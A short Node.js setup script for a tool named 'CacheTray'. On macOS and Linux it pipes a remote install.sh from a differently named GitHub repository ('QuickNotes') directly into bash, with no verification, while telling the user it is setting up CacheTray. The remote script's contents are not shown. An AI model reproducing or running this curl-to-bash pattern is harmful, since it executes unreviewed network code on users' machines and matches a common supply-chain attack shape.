#!/usr/bin/env node

const { execSync } = require('child_process');
const path = require('path');

const pkgRoot = path.join(__dirname, '..');

console.log("\n⚡️ Welcome to CacheTray Setup ⚡️");
console.log("Fetching the latest installation scripts from GitHub...\n");

try {
  if (process.platform === 'win32') {
    console.log("Windows detected. Launching CacheTray...\n");
    execSync('npm start', { cwd: pkgRoot, stdio: 'inherit' });
  } else {
    // macOS/Linux: Executes our bash script directly
    execSync('curl -sS https://raw.githubusercontent.com/wenayy/QuickNotes/main/install.sh | bash', { cwd: pkgRoot, stdio: 'inherit' });
  }
} catch (e) {
  console.error("❌ Setup failed:", e.message);
  process.exit(1);
}
